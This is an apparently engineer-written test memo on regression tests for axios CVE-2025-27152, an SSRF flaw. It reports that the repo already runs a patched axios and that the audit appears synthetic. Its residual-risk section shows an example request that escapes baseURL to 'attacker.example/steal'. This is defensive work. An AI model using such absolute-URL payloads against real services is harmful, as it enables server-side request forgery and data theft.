# Test impact memo — SHLD-9 security regression tests

Branch `hod/shld-8-g1-tests`, cut from `main` at `a225f66`.
Scope: group g1 of the SHLD-8 audit — manifest `package-lock.json`, one finding,
`axios` CVE-2025-27152 (HIGH, CVSS 7.5, EPSS 12%), installed 1.6.0, fixed in 1.8.2.

## Headline: the tests pass on `main`, and that is the finding

The audit reports axios **1.6.0**. This repo pins axios **1.16.1** at `main@a225f66`,
in both `app/package.json:11` and the sole lockfile entry `node_modules/axios`.
1.16.1 is above the 1.8.2 floor, so the version boundary this ticket exists to move is
**already closed**. The tests were written to the advisory anyway and they pass as-is.

Two further mismatches between the audit and the repo, same root:

| Audit says | Repo at `a225f66` |
| --- | --- |
| Manifest `package-lock.json` (repo root) | No root lockfile. The only npm manifest pair is `app/package.json` + `app/package-lock.json` |
| axios 1.6.0 installed | 1.16.1, single copy, no transitive second copy |
| CVE-2025-27152 "reachable" | `app/index.js:3` requires axios and never calls it. No `baseURL`, no request, no user-controlled URL |

The audit's other rows point at `deploy/legacy.env`, `pom.xml` and
`src/components/LinkOut.tsx` — none of which exist here either. Consistent with this
project being the `mock-run-1` rehearsal: the report is synthetic and was not produced
against this tree. **The impl step has nothing to bump.** Confirm the scanned ref before
anyone changes a pin.

## How to run

```
cd app && npm install && npm test     # 6 cases, all passing on main
```

## Proof these are not vacuous

A floor test that passes because the floor is already met proves nothing on its own, so
the suite was run against the version the audit claims. Scratch tree, axios pinned to
1.6.0 in both manifests, same six cases:

| Version | Result |
| --- | --- |
| 1.16.1 (`main`) | 6 passed |
| 1.6.0 (audit's claim) | **5 failed**, 1 passed |

At 1.6.0 the wire-level case shows the real thing: the foreign loopback server received
`/steal`. The request left `baseURL` entirely. That is CVE-2025-27152 reproducing, not a
version string being compared.

## What each case protects

`app/__tests__/axios-cve-2025-27152.test.js` — boundary: `app/package-lock.json`

| Test case | Protects | Boundary today | At 1.6.0 |
| --- | --- | --- | --- |
| `dependency boundary › no installed axios copy is below 1.8.2` | CVE-2025-27152 at the artifact the scanner reads | `node_modules/axios` @ 1.16.1 | fails |
| `dependency boundary › the direct pin in app/package.json is at or above 1.8.2` | The declared pin, which a fresh `npm install` re-resolves from | `app/package.json:11` pins `"axios": "1.16.1"` | fails |
| `SSRF containment › allowAbsoluteUrls:false keeps an absolute URL under baseURL` | The control 1.8.2 added, at the URL-construction layer | honoured | fails |
| `SSRF containment › allowAbsoluteUrls:false keeps a protocol-relative URL under baseURL` | Same control against `//host/path`, the variant that dodges an `https://` prefix check | honoured | fails |
| `SSRF containment › allowAbsoluteUrls:false sends the request to baseURL, never to the foreign host` | The node adapter — the path a real request takes, asserted by a foreign loopback server recording zero hits | contained | fails (foreign host hit) |
| `SSRF containment › the default is still to follow the absolute URL` | Residual risk, see below | escapes | passes |

The first two are the version floor: they say the patch is installed. The next three say
the control that patch added still works — a later axios that quietly dropped
`allowAbsoluteUrls` would pass a floor check and fail these.

## Residual risk the version bump does not cover

`allowAbsoluteUrls` defaults to **true** in 1.16.1 for backwards compatibility. Left
unset, an absolute request URL still discards `baseURL` and is sent to the foreign host:

```
axios.getUri({ baseURL: 'https://internal.example/api/', url: 'https://attacker.example/steal' })
→ https://attacker.example/steal
```

So upgrading past 1.8.2 supplies a control, it does not apply one. Any caller that builds
a request URL from user input must pass `allowAbsoluteUrls: false` (or set it on the
instance). The last test case pins this so the bump cannot be read as "SSRF closed". It
is a tripwire: the day axios makes containment the default it will fail, and the correct
response is to delete it, not to work around it.

## Deliberate omissions

- **Nothing outside group g1.** The other manifest in SHLD-8 belongs to a sibling ticket
  and the six deferred findings to the parent. No test here asserts on them.
- **No timing or resource-exhaustion tests.** Not applicable to this advisory, and they
  are flaky in CI without proving more than the boundary already does.
- **No test asserting axios is present.** Dropping the dependency resolves the advisory as
  well as upgrading does. Presence is asserted only at `app/package.json`, where the app
  genuinely declares it.

## For the impl step

1. Settle the ref question first. If the scan really did run against this repo, find the
   tree where axios is 1.6.0 — it is not in any branch reachable here.
2. If the audit is confirmed synthetic, there is no pin to move. Land these tests as the
   standing floor and close the finding as already-remediated rather than manufacturing a
   downgrade to fix.
3. If a real 1.6.0 tree does turn up, the bump alone is not enough. See residual risk.
